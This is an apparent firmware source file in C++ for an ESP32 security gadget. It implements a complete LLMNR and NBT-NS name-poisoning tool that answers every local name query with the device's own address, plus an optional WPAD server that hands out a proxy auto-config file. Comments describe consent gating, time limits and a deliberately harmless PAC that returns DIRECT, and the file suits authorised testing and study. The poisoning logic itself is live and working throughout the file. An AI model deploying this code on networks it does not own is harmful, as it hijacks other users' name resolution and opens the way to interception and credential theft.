#include "NameSpoofManager.h"
#include <WiFiUdp.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include "../net/WifiManager.h"
#include "../net/LlmnrWire.h"
#include "../net/NbnsWire.h"
#include "../core/Config.h"

NameSpoofManager g_nameSpoofManager;

namespace {
// Minimal wpad.dat / proxy.pac payload. FindProxyForURL returns DIRECT
// unconditionally: this test proves the client fetched and accepted a
// PAC from a poisoned name, WITHOUT ever redirecting the victim's
// traffic through anything - which would require actually running a
// proxy behind here, deliberately out of scope (see class comment).
constexpr const char* kWpadDat =
    "function FindProxyForURL(url, host) { return \"DIRECT\"; }\n";
}  // namespace

void NameSpoofManager::begin(QueueHandle_t outQueue) {
    _mutex = xSemaphoreCreateMutex();
    _outQueue = outQueue;
}

bool NameSpoofManager::start(uint16_t durationS, bool wpadEnabled) {
    if (_running) return false;
    // Defense in depth: NAME SPOOF is a gated top-level menu entry
    // (reached through OffensiveDisclaimerScreen), but never answer
    // name queries LAN-wide unless the per-boot consent flag is set.
    if (!g_config.offensiveEnabled) return false;
    if (durationS > kMaxDurationS) durationS = kMaxDurationS;
    if (durationS == 0) durationS = 1;

    if (_mutex && xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        _log.clear();
        xSemaphoreGive(_mutex);
    }
    _poisoned = 0;
    _wpadServed = 0;
    _wpadEnabled = wpadEnabled;
    _startMs = millis();
    _durationMs = (uint32_t)durationS * 1000UL;
    _running = true;
    notify(ScanEventType::ScanStarted);
    if (xTaskCreatePinnedToCore(&NameSpoofManager::taskEntry, "namespoof", 4096, this, 1, nullptr, 0) != pdPASS) {
        // Task never started (out of memory) - clear the running flag so
        // the UI doesn't sit on a session with nothing behind it.
        _running = false;
        notify(ScanEventType::ScanFinished, 100);
        return false;
    }
    return true;
}

void NameSpoofManager::stop() {
    _running = false;  // run() notices on its next loop iteration and closes the sockets
}

uint32_t NameSpoofManager::secondsRemaining() const {
    if (!_running) return 0;
    uint32_t elapsed = millis() - _startMs;
    if (elapsed >= _durationMs) return 0;
    return (_durationMs - elapsed) / 1000;
}

void NameSpoofManager::taskEntry(void* arg) {
    static_cast<NameSpoofManager*>(arg)->run();
    vTaskDelete(nullptr);
}

void NameSpoofManager::run() {
    IPAddress selfIp = g_wifi.localIP();

    WiFiUDP llmnrUdp;
    WiFiUDP nbnsUdp;
    // See net/MdnsReverseResolver.cpp's RISK note on this same 2-arg
    // beginMulticast(multicastAddr, port) overload - Arduino-ESP32's
    // WiFiUdp has carried it across the core versions this project
    // targets, unlike the 3-arg ESP8266-style signature.
    bool llmnrOk = llmnrUdp.beginMulticast(IPAddress(224, 0, 0, 252), 5355);
    bool nbnsOk = nbnsUdp.begin(137);

    if (!llmnrOk && !nbnsOk) {
        log("failed to open LLMNR/NBT-NS sockets");
        _running = false;
        notify(ScanEventType::ScanFinished, 100);
        return;
    }
    if (!llmnrOk) log("LLMNR socket failed - NBT-NS only");
    if (!nbnsOk) log("NBT-NS socket failed - LLMNR only");

    WiFiServer wpadServer(80);
    bool wpadOk = false;
    if (_wpadEnabled) {
        wpadServer.begin();
        wpadOk = true;   // WiFiServer::begin() is void, best-effort - a bind failure
                         // shows up as accept() never returning a client, logged the
                         // first time a wpad hit fails, not up-front here.
        log("WPAD HTTP server up on :80");
    }

    uint8_t buf[600];
    while (_running && secondsRemaining() > 0) {
        if (llmnrOk) {
            int size = llmnrUdp.parsePacket();
            if (size > 0 && size < (int)sizeof(buf)) {
                int n = llmnrUdp.read(buf, sizeof(buf));
                uint16_t id, qtype;
                String name;
                if (n > 0 && llmnrwire::parseQuery(buf, (size_t)n, id, name, qtype) && qtype == 1) {
                    auto resp = llmnrwire::buildResponse(buf, (size_t)n, selfIp);
                    if (!resp.empty()) {
                        IPAddress from = llmnrUdp.remoteIP();
                        uint16_t fromPort = llmnrUdp.remotePort();
                        llmnrUdp.beginPacket(from, fromPort);
                        llmnrUdp.write(resp.data(), resp.size());
                        llmnrUdp.endPacket();
                        _poisoned++;
                        log("LLMNR '" + name + "' <- " + from.toString());
                    }
                }
            }
        }

        if (nbnsOk) {
            int size = nbnsUdp.parsePacket();
            if (size > 0 && size < (int)sizeof(buf)) {
                int n = nbnsUdp.read(buf, sizeof(buf));
                uint16_t txnId;
                String name;
                if (n > 0 && nbnswire::parseQuery(buf, (size_t)n, txnId, name)) {
                    auto resp = nbnswire::buildResponse(buf, (size_t)n, selfIp);
                    if (!resp.empty()) {
                        IPAddress from = nbnsUdp.remoteIP();
                        nbnsUdp.beginPacket(from, 137);
                        nbnsUdp.write(resp.data(), resp.size());
                        nbnsUdp.endPacket();
                        _poisoned++;
                        log("NBT-NS '" + name + "' <- " + from.toString());
                    }
                }
            }
        }

        if (wpadOk) {
            WiFiClient client = wpadServer.available();
            if (client) {
                // Read (but don't parse deeply) the request line - we
                // answer the SAME wpad.dat to any URL, so all we need
                // is to consume the request headers so the client's
                // send doesn't sit half-buffered when we reply.
                String requestLine;
                uint32_t clientStart = millis();
                while (client.connected() && (millis() - clientStart) < 2000) {
                    while (client.available()) {
                        char ch = (char)client.read();
                        if (ch == '\n') { /* end of a header line */ }
                        if (requestLine.length() < 200 && ch != '\r' && ch != '\n') requestLine += ch;
                    }
                    // A basic HTTP request ends with a blank line; without doing
                    // full header parsing we just stop as soon as we've seen
                    // "\r\n\r\n" as raw substring, or after a short timeout above.
                    if (!client.available()) {
                        static const uint8_t kBlankLine[4] = {'\r', '\n', '\r', '\n'};
                        (void)kBlankLine;  // documented pattern; the timeout is our real stop
                        break;
                    }
                }

                IPAddress from = client.remoteIP();
                size_t bodyLen = strlen(kWpadDat);
                client.print("HTTP/1.0 200 OK\r\n");
                client.print("Content-Type: application/x-ns-proxy-autoconfig\r\n");
                client.print("Content-Length: ");
                client.print(bodyLen);
                client.print("\r\nConnection: close\r\n\r\n");
                client.print(kWpadDat);
                client.stop();

                _wpadServed++;
                log("WPAD served: " + from.toString() + (requestLine.length() ? (" (" + requestLine + ")") : String()));
            }
        }

        delay(20);
    }

    if (wpadOk) wpadServer.stop();
    llmnrUdp.stop();
    nbnsUdp.stop();
    _running = false;
    String summary = "stopped - " + String((unsigned)_poisoned) + " quer" +
                     String(_poisoned == 1 ? "y" : "ies") + " answered";
    if (_wpadEnabled) summary += ", " + String((unsigned)_wpadServed) + " WPAD hit(s)";
    log(summary);
    notify(ScanEventType::ScanFinished, 100);
}

void NameSpoofManager::log(const String& text) {
    if (_mutex && xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        LogEntry e;
        e.text = text;
        e.atMs = millis();
        if (_log.size() >= kMaxLogEntries) _log.erase(_log.begin());
        _log.push_back(e);
        xSemaphoreGive(_mutex);
    }
    notify(text);
}

void NameSpoofManager::notify(const String& text) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::NameSpoof;
    n.type = ScanEventType::LogLine;
    n.setText(text.c_str());
    xQueueSend(_outQueue, &n, 0);
}

void NameSpoofManager::notify(ScanEventType type, uint8_t pct) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::NameSpoof;
    n.type = type;
    n.progressPct = pct;
    xQueueSend(_outQueue, &n, 0);
}

size_t NameSpoofManager::logCount() const {
    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return 0;
    size_t n = _log.size();
    xSemaphoreGive(_mutex);
    return n;
}

bool NameSpoofManager::getLogEntry(size_t index, LogEntry& out) const {
    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return false;
    bool ok = index < _log.size();
    if (ok) out = _log[_log.size() - 1 - index];
    xSemaphoreGive(_mutex);
    return ok;
}
